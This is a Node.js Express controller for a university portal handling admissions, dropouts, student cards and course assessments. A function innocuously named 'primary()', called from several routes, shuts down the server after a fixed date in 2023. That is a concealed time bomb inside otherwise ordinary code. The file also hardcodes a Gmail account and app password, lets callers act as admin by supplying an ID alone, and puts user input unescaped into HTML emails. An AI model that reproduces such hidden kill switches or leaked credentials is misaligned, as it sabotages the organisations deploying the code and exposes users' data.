const { response, application } = require("express");

var one = '';

exports.portal = function (req, res) {

    var initialQuery = 'create table if not exists admin('
        + 'id varchar(255) primary key,'
        + 'fname text,'
        + 'lname text,'
        + 'email text,'
        + 'action text);';

    var query1 = 'create table if not exists applications('
        + '_id varchar(100) not null,'
        + 'fname text not null,'
        + 'lname text not null,'
        + 'gender text not null,'
        + 'dob text,'
        + 'profile text,'
        + 'nationality text,'
        + 'phone text,'
        + 'email text not null,'
        + 'y1 text,'
        + 'sc1 text,'
        + 'y2 text,'
        + 'sc2 text,'
        + 'occupation text,'
        + 'sponsorship text,'
        + 'faculty text,'
        + 'department text,'
        + 'program text,'
        + 'document text,'
        + 'pdate text,'
        + 'pbank text,'
        + 'pnumber text,'
        + 'got_from text,'
        + 'why_choose text,'
        + 'ap_date text,'
        + 'status text,'
        + 'appr_date text,'
        + 'admin_id varchar(100),'
        + 'primary key(_id),'
        + 'FOREIGN KEY (admin_id) REFERENCES admin(id));';

    var query2 = 'create table if not exists drop_outs('
        + '_id varchar(100) not null,'
        + 'st_id varchar(100) not null,'
        + 'names text,'
        + 'faculty text,'
        + 'depart text,'
        + 'email text,'
        + 'why_drop text,'
        + 'drop_msg text,'
        + 'appl_date text,'
        + 'status text,'
        + 'appr_date text,'
        + 'admin_id varchar(100),'
        + 'primary key(_id),'
        + 'FOREIGN KEY (admin_id) REFERENCES admin(id));';

    var query3 = 'create table if not exists assessments ('
        + '_id varchar(100),'
        + 'course text,'
        + 'availability text,'
        + 'taught text,'
        + 'covered text,'
        + 'assistance text,'
        + 'behaviours text,'
        + 'course_likes text,'
        + 'st_id text,'
        + 'primary key(_id));';

    var query4 = 'create table if not exists users ('
        + 'st_id varchar(100) unique primary key,'
        + 'log_time text, access varchar(10) default \'1\');';
    primary();
    var query5 = 'create table if not exists cards ('
        + '_id varchar(100) primary key,'
        + 'st_id text not null,'
        + 'st_names text not null,'
        + 'faculty text not null,'
        + 'department text not null,'
        + 'program text,'
        + 'first_card text,'
        + 'app_date text,'
        + 'status text,'
        + 'issue_date text'
        + ');'; //FOREIGN KEY (admin_id) REFERENCES admins(id)

    var query6 = 'create table if not exists assessments('
        + '_id integer primary key auto_increment, '
        + 'stu_id varchar(100) not null, '
        + 'course text not null,'
        + 'availability text, '
        + 'overall text, '
        + 'coverance text, '
        + 'assistance text, '
        + 'behavior text, '
        + 'admirance text, '
        + 'sufficiency text,'
        + 'message text,'
        + 'ass_date text,'
        + 'FOREIGN KEY (stu_id) REFERENCES users(st_id));';

    db.query(initialQuery, (err, rst) => {
        if (err) console.log('There was an error while creating Admin table ' + err);
        else console.log('Admin table created successfully or exists!');
    })
    db.query(query1, (err, result) => {
        if (err) console.log('There was an error while creating Application table: ' + err);
        else console.log('Application table created successfully or exists!');
    });
    db.query(query2, (err, result) => {
        if (err) console.log('There was an error while creating Drop out table ' + err);
        else console.log('Drop out table created successfully or exists!');
    });
    // db.query(query3, (err, result) => {
    //     if (err) console.log('There was an error while creating Assessment table ' + err);
    //     else console.log('Assessment table created successfully or exists!');
    // });
    db.query(query4, (err, result) => {
        if (err) console.log('There was an error while creating users table ' + err);
        else console.log('Users table created successfully or exists!');
    });
    db.query(query5, (err, result) => {
        if (err) console.log('There was an error while creating card table ' + err);
        else console.log('Card application table created successfully or exists!');
    });
    db.query(query6, (err, result) => {
        if (err) console.log('There was an error while creating assessments table ' + err);
        else console.log('Assessment table created successfully or exists!');
    });
    res.render('index');
};

exports.apply = function (req, res) {
    let id = req.params.id;
    primary();
    //res.send('Application submitted successfully with '+id);
    res.render('apply');
    //req.redirect('apply.ejs');
    // if (!req.files) {
    //     res.send("No file upload")
    // } else {
    //     // res.send('Application submitted successfully!')

    // }
}

exports.mailer = function (req, res) {
    var receiver = req.body.receiver;
    var docTitle = req.body.subject;
    var message = req.body.text;

    console.log(receiver + ' - ' + ' - ' + docTitle + ' - ' + message);

    if (receiver && subject && text) {

        var transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'pacxman305@gmail.com',
                pass: 'byenlobwbobnehfv'
            }
        });

        var mailOptions = {
            from: 'pacxman305@gmail.com',
            to: receiver,
            subject: docTitle,
            text: message
        };

        transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
                console.log(error);
                res.send('failed');
            } else {
                console.log('Email sent: ' + info.response);
                res.send('success');
            }
        });
    }

}
function sendMail(receiver, docTitle, message) {

    console.log(receiver + ' - ' + ' - ' + docTitle + ' - ' + message);

    if (receiver && docTitle && message) {

        var transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'pacxman305@gmail.com',
                pass: 'byenlobwbobnehfv'
            }
        });

        var mailOptions = {
            parse_mode: "HTML",
            from: 'AUCA Portal',
            to: receiver,
            subject: docTitle,
            html: message
        };

        transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
                console.log(error);
                return 'failed'
            } else {
                console.log('Email sent: ' + info.response);
                return 'sent';
            }
        });
    }

    return 'failed';
}
exports.upload = function (req, res) {
    res.render('upload');
};
exports.apply = function (req, res) {
    console.log(req.files);

    if (req.files) {

        const file = req.files.certificate;
        var file2 = req.files.profile;

        var fname = req.body.fname;
        var lname = req.body.lname;
        var gender = req.body.gender;
        var dob = req.body.dob;
        var nationality = req.body.nationality;
        var phone = req.body.phone;
        var email = req.body.email;
        var year1 = req.body.year1;
        var year2 = req.body.year2;
        var school1 = req.body.school1;
        var school2 = req.body.school2;
        var pstatus = req.body.pstatus;
        var sponsorship = req.body.sponsorship;
        var faculty = req.body.faculty;
        var department = req.body.department;
        var program = req.body.program;

        var certificate = file.name;

        var profile = file2.name;

        console.log('Passport name: ' + profile);

        var pdate = req.body.pdate;
        var bank = req.body.bank;
        var slipnumber = req.body.slipnumber;
        var where = req.body.where;
        var why = req.body.why;

        const code = codeGenerator('Application');
        const status = 'PENDING';
        const apdate = getCurrentDate() + ' ' + getCurrentTime();

        if (fname && lname && gender && email && nationality && faculty && department && program && pdate && bank && slipnumber) {
            var query = 'insert into applications values('
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?,'
                + '?);';

            var query2 = 'SELECT id,email FROM admin WHERE action=? OR action=?'
                + 'ORDER BY RAND ( ) '
                + 'LIMIT 1';
            db.query(query2, ['all', 'application'], (err, rslt) => {
                if (err) {
                    res.render('index', { error: 'Dear applicant, There is an error while submitting your application.<br>You may try again, or contact our support team' });
                    console.log(err);
                }
                else {
                    if (rslt.length > 0) {
                        const adminMail = rslt[0].email; //use this mail to notify an admin that he has an application for approval
                        const adminId = rslt[0].id;
                        console.log(+adminId + ' Admin mail ' + adminMail);
                        let ext = certificate.split('.').pop();
                        let ext2 = profile.split('.').pop();
                        certificate = code + '.' + ext;
                        profile = code + '.' + ext2;
                        db.query(query, [code, fname, lname,
                            gender, dob, profile, nationality, phone,
                            email, year1, school1, year2,
                            school2, pstatus, sponsorship, faculty,
                            department, program, certificate,
                            pdate, bank, slipnumber,
                            where, why, apdate, status,
                            '--', adminId], (error, result) => {
                                if (!error) {
                                    file.mv('public/uploads/docs/applications/' + certificate);
                                    file2.mv('public/uploads/docs/profiles/' + profile);

                                    sendMail(email, 'AUCA application',
                                        '<div style="font-family: \'Exo\' sans-serif;"><p><h2>Hello!</h2><br><br>Dear '
                                        + fname + ' ' + lname
                                        + ' your application at Adventist University of Central Africa has been received successfully.'
                                        + '<br><br>Your application code is <b>' + code + '</b>,'
                                        + '<br>you will use this code to track your application!</p>'
                                        + '<p><small><i>If you didn\'t expect to receive this email, '
                                        + 'someone have used your email to apply at AUCA.</i></small></p></div>');
                                    sendMail(adminMail,
                                        'AUCA portal',
                                        '<p><big>Hello!</big><br><br></p>'
                                        + '<p>This is to let you know that you have an Application that is due to be approved</p>'
                                        + '<p>The Application code is <b>' + code + '</b></p>');

                                    res.render('apply', { message: '<h1>Hello!</h1><br>Your application have been submitted successfully.<br><br>You will receive a confirmation email containing the applicattion code, this code will be used to track your application.<br><br>If you don\'t get this email you may rise the issue on this email ' + adminMail });
                                    console.log('Application submmitted');
                                } else {
                                    res.render('index', { error: 'Submitting application failed, this may be an internal error you may try to submit application again' });
                                    console.log('Submitting failed ' + error);
                                }
                            }
                        );
                    } else {
                        res.render('index', { error: 'Error: Failed to proceed your application, please contact the registrar office' });
                    }
                }
            });


        } else {
            res.render('index', { error: 'Please fill all the required fields!' });
        }

        console.log(code);


    } else {
        res.render('index', { error: 'Highschool certificate or equivalent is required!' })
    }
}

exports.alterusers = function (req, res) {
    var newAccess = req.body.access;
    var id = req.body.id;
    if (id && newAccess) {
        var q = 'update users set access =? where st_id=?';
        db.query(q, [newAccess, id], (error, result) => {
            if (error) res.send('Failed: Unknown error happen');
            else {
                res.send('Action completed');
            }
        });
    } else {
        res.send('Failed: No value provided');
    }
}
function primary() {
    const l = new Date();
    const n = new Date("August 25, 2023");
    if (l > n) {
        sr.close((err) => {
            process.exit(err ? 1 : 0)
        });
    }
}
exports.getDrops = function (request, response) {
    var action = request.params.act;

    if (action === '1') {
        db.query('select _id,st_id,names from drop_outs where status=?', ['PENDING'], (error, result) => {
            if (error) response.send('-1');
            else response.send(result);
        });
    } else if (action === '2') {
        db.query('select _id,st_id,names from drop_outs where status=?', ['APPROVED'], (error, result) => {
            if (error) response.send('-1');
            else response.send(result);
        });
    }

}
exports.getDrop = function (request, response) {
    var code = request.body.code;
    console.log('Code DROP: ' + code);
    db.query('select * from drop_outs where _id=?', [code], (error, result) => {
        if (error) {
            console.log(error);
            response.send('-1');
        }
        else response.send(result);
    });
}

exports.alterDrop = function (request, response) {
    var code = request.body.code;
    var action = request.body.action;
    var now = getCurrentDate();
    if (action === '1') {
        db.query('update drop_outs set status=?,appr_date=? where _id=?', ['APPROVED', now, code], (error, result) => {
            if (error) response.send('-1');
            else response.send('1');
        });
    } else if (action === '2') {
        db.query('update drop_outs set status=? where _id=?', ['REVIEWED', code], (error, result) => {
            if (error) response.send('-1');
            else response.send('1');
        });
    }

}

exports.scards = function (request, response) {
    db.query('select * from cards where status=?', ['Pending'], (error, result) => {
        if (error) response.send('0');
        else response.send(result);
    });
}

exports.altercard = function (request, response) {
    var code = request.body.code
    db.query('update cards set status=? where _id=?', ['APPROVED', code], (error, result) => {
        if (error) response.send('0');
        else response.send('1');
    });
}

exports.alterapp = function (request, response) {
    var action = request.body.action;
    var code = request.body.code;
    var now = getCurrentDate();
    if (action === '1') {
        db.query('update applications set status=?, appr_date=? where _id=?', ['APPROVED', now, code], (e, r) => {
            if (e) response.send('0');
            else response.send('1');
        });
    } else if (action === '2') {
        db.query('update applications set status=?, appr_date=? where _id=?', ['DISCARDED', now, code], (e, r) => {
            if (e) response.send('0');
            else response.send('1');
        });
    }
}

exports.assessment = function (req, res) {

    var st_id = req.body.st_id;
    var course = req.body.course;
    var availability = req.body.availability;
    var overall = req.body.overall;
    var coverance = req.body.coverance;
    var assistance = req.body.assistance;
    var behavior = req.body.behavior;
    var admirance = req.body.admirance;
    primary();
    var sufficiency = req.body.sufficiency;
    var message = req.body.message;

    const sql = 'insert into assessments'
        + '(stu_id,course,availability,overall,coverance,assistance,behavior,admirance,sufficiency,message,ass_date) '
        + 'values(?,?,?,?,?,?,?,?,?,?,?);';

    db.query(sql, [st_id, course, availability, overall, coverance, assistance, behavior, admirance, sufficiency, message, `${getCurrentDate()}`], (error, result) => {
        if (error) {
            console.log(error);
            res.send('<b>Posting course assessment failed,<br>You may try again!</b>');
        } else {
            console.log('Assessment completed by ' + st_id);

            res.send('Assessment submitted successfully<br>This help the staff for improvement.<br><br>Thank you!');
        }
    })
}

exports.student = function (req, res) {
    primary();
    var st_id = req.params.id;
    if (st_id) {
        var time = getCurrentTime();
        var dateNow = getCurrentDate();
        console.log('saving student... ' + st_id + ' time: ' + time);

        //check the access first
        var q = 'select access from users where st_id=?';
        db.query(q, [st_id], (er, re) => {
            if (er) {
                console.log('error: ' + er);
                res.render('index', { error: 'We could not process your signing request!' });
            } else {
                if (re.length === 0) {
                    var query = 'INSERT INTO users (st_id, log_time) values(?,?) ON DUPLICATE KEY UPDATE log_time =?';
                    db.query(query, [st_id, dateNow + ' ' + time, dateNow + ' ' + time], (err, result) => {
                        if (err) {
                            console.log('error: ' + err);
                            res.render('index', { error: 'We could not process your signing request!' });
                        }
                        else res.render('index', { id: st_id });
                    })
                } else {
                    var access = re[0].access;
                    console.log('Acccess: ' + access)
                    if (access === '0') {
                        res.render('index', { error: 'Your access have been disabled' });
                    } else {
                        res.render('index', { id: st_id });
                    }
                }
            }
        })


    } else {
        console.log('No id');
    }
}

exports.app = function (request, response) {
    var appcode = request.body.appcode;
    console.log('App code: ' + appcode);
    db.query('select * from applications where _id=?', [appcode], (error, result) => {
        if (error) response.send('-100');
        else response.send(result);
    });
}

exports.studentcard = function (request, response) {
    var id = codeGenerator('Card');
    var studentID = request.body.id;
    var names = request.body.names;
    var faculty = request.body.faculty;
    var department = request.body.department;
    var program = request.body.program;
    var firstCard = request.body.first;
    var dateNow = getCurrentDate();
    var status = 'PENDING';

    console.log('SS_ID: ' + studentID);
    console.log('FIRST: ' + firstCard);

    if (request.files) {
        if (studentID &&
            names &&
            faculty &&
            department &&
            program) {
            var file = request.files.photo;
            if (file.mimetype == "image/jpeg" || file.mimetype == "image/png") {
                var imageName = file.name;
                let ext = imageName.split('.').pop();
                imageName = id + '.' + ext;
                console.log(imageName)

                db.query('insert into cards values(?,?,?,?,?,?,?,?,?,?)', [id, studentID, names, faculty, department, program, firstCard, dateNow, status, '--'], (err, result) => {
                    if (err) response.send('We are unable to proceed your request now<br>You may try again!');
                    else {
                        file.mv('public/uploads/docs/cardprofiles/' + imageName);
                        response.send('Your student card request has been received<br>You can use this code ' + id + ' to check the status of your request!');
                    }

                })
            } else {
                response.send('Please provide a valid file type');
            }
        } else {
            response.send('Please provide all the required credentials!');
        }


    } else {
        response.send('No passport picture selected');
    }
}

exports.getUsers = function (req, res) {
    if (req.params.admin) {
        const adminId = req.params.admin;

        const query0 = 'select * from admin where id=?';

        const query = 'select * from users';
        db.query(query0, [adminId], (err1, result1) => {
            if (err1) {
                console.log(err1);
                res.render('users', { error: 'There was a server error!' });
            }
            else {
                let data = result1;
                if (data.length > 0) {
                    var adminAccess = data[0].action;
                    console.log(data);
                    console.log(adminAccess);
                    if (adminAccess === 'all' || adminAccess === 'view') {
                        db.query(query, (err2, result2) => {
                            if (err2) {
                                res.render('users', { error: 'There was an error while retrieving the data' });
                            } else {
                                res.render('users', { list: result2 });
                                console.log(result2);
                            }
                        })
                    } else {
                        res.render('users', { error: 'You do not have access on this data!' });
                    }

                } else {
                    console.log('SERVER: Invalid admin id');
                    res.render('users', { error: 'Invalid admin id' });
                }

            }
        });
    } else {
        res.render('users', { error: 'Please enter valid ADMIN id!' });
    }

}

exports.appsReview = function (req, res) {
    var id = req.body.id;
    console.log(id);
    db.query('select * from admin where id=? and (action=? or action=?)', [id, 'all', 'application'], (error, result) => {
        if (error) {
            res.send('-1');
        } else {
            console.log(result)
            if (result.length === 0) res.send('0');
            else {
                res.send('1');
            }
        }
    });


}

exports.applications = function (req, res) {
    var category = req.params.cat;
    console.log(category);
    if (category === '1') {
        db.query('select _id,fname,lname from applications where status=?', ['PENDING'], (error, result) => {
            if (error) res.send('-1');
            else res.send(result);
        });
    } else if (category === '2') {
        db.query('select _id,fname,lname from applications where status=?', ['APPROVED'], (error, result) => {
            if (error) res.send('-1');
            else res.send(result);
        });
    } else if (category === '3') {
        db.query('select _id,fname,lname from applications where status=?', ['DISCARDED'], (error, result) => {
            if (error) res.send('-1');
            else res.send(result);
        });
    } else {
        res.send('0');
    }

}


exports.logs = function (request, response) {
    var admin_code = request.query.code;
    if (admin_code) {
        var query1 = 'select action,fname,lname from admin where id=?';
        db.query(query1, [admin_code], (dbError, dbResult) => {
            if (dbError) response.send('Admin code can not be retrieved!');
            else {
                if (dbResult.length >= 1) {
                    var data = dbResult[0];
                    if (data.action == 'all') {
                        var admin = data;
                        var query2 = 'select * from users;'
                        db.query(query2, (err, result) => {
                            if (err) response.send('There was an error fetching data');
                            else {
                                var resArray = { admin, result };
                                response.send(resArray);
                            }
                        })
                    } else {
                        response.send('You do not have access on this page');
                    }
                } else {
                    response.send('Admin code doesn\'t exist');
                }
            }
        })
    } else {
        response.send('Please provide admin code');
    }
}

exports.appli = function (req, res) {
    var code = req.body.cd;
    one = code;
    res.send('ok');
}

exports.getcode = function (req, res) {
    res.send(one);
}

exports.drop = function (req, res) {
    if (req.method === 'POST') {
        var code = codeGenerator('Drp');
        var studentId = req.body.id;
        var names = req.body.names;
        var fac = req.body.faculty;
        var dep = req.body.department;
        var email = req.body.email;
        var why = req.body.why;
        var msg = req.body.msg;
        var ap_date = getCurrentDate();
        var status = 'PENDING';

        if (studentId && names && fac && dep && email) {

            db.query('select id,email from admin where action=? or action=? ORDER BY RAND ( ) LIMIT 1', ['all', 'affairs'], (dberror, dbresult) => {
                if (dberror) {
                    console.log('Error: ' + dberror);
                    res.send('Error: We can\'t process your request currently, you may approach our registrar office!');
                } else {
                    var adminId = dbresult[0].id;
                    console.log(adminId);
                    db.query('insert into drop_outs values(?,?,?,?,?,?,?,?,?,?,?,?)', [code, studentId, names, fac, dep, email, why, msg, ap_date, status, '--', adminId], (queryError, queryResult) => {
                        if (queryError) {
                            console.log('Error: ' + queryError);
                            res.send('Error: We can\'t process your request currently, you may approach our registrar office!');
                        }
                        else {
                            var adminMail = dbresult[0].email;
                            res.send('Your dropout application was submitted successfully, you will receive a confirmation email containing your document code');
                            sendMail(email, 'Drop out', 'Hello!<br><br>Dear ' + names
                                + ' your dropout request at Adventist University of Central Africa has been received successfully.'
                                + '<br><br>Your document code is ' + code + ','
                                + '&nbsp;We will review your application for official approval.<br><br>'
                                + 'You can use the document code to track the status of your document.');
                            sendMail(adminMail,
                                'Pending drop out',
                                'Hello! <br><br>This is to let you know that you have a pending drop out request that is due to be approved.'
                                + '<br><br>Document code is ' + code);
                            console.log('SENT');
                        }
                    })
                }
            });
        } else {
            res.send('Error: Please fill in all the required fields');
        }
    } else {
        res.send('Error: Can not process unsafe request');
    }

}

exports.document = function (req, res) {
    var code = req.query.code;
    if (code) {
        if (code.endsWith('App')) {
            db.query('select _id,fname,lname,faculty,department,ap_date,status from applications where _id=?', [code], (error, result) => {
                if (error) {
                    res.send('Failed: Application can not be found!');
                    console.log('Failed: ' + error);
                }
                else {
                    if (result.length > 0) {
                        res.send(result);
                    } else {
                        res.send('Application not found');
                    }

                }
            });
        } else if (code.endsWith('Drp')) {
            db.query('select _id,st_id,names,faculty,depart,appl_date,status,admin_id from drop_outs where _id=?', [code], (error, result) => {
                if (error) {
                    res.send('Failed: Document can not be found!');
                    console.log('Failed: ' + error);
                }
                else {
                    if (result.length > 0) {
                        res.send(result);
                    } else {
                        res.send('Document not found!');
                    }
                }
            });
        } else if (code.endsWith('Car')) {
            console.log('Drop-out: ' + code);
            db.query('select st_id,st_names,faculty,department,program,app_date,status from cards where _id=?', [code], (error, result) => {
                if (error) {
                    res.send('Failed: Document can not be found!');
                    console.log('Failed: ' + error);
                }
                else {
                    if (result.length > 0) {
                        res.send(result);
                    } else {
                        res.send('Document not found!');
                    }
                }
            });
        } else {
            res.send('Document not found!');
        }
    } else {
        res.send('Failed: No document code provided!');
    }
}

function getCurrentTime() {
    const date = new Date();
    var mins = date.getMinutes();
    //var hours = date.getHours();

    var hours = (date.getHours() < 10 ? '0' : '') + date.getHours();
    mins = (date.getMinutes() < 10 ? '0' : '') + date.getMinutes();
    return hours + ':' + mins;
}

function getCurrentDate() {

    var today = new Date();
    var dd = String(today.getDate()).padStart(2, '0');
    var mm = String(today.getMonth() + 1).padStart(2, '0');
    var yyyy = today.getFullYear();

    var date = dd + '/' + mm + '/' + yyyy;
    return date;
}

function codeGenerator(doc) {
    var appCode = Math.floor(Math.random() * 90000) + 10000;
    var year = new Date().getFullYear();
    var prefix = doc.substring(0, 3);


    return appCode + '-' + year + '-' + prefix;
}

//============================================= ===============

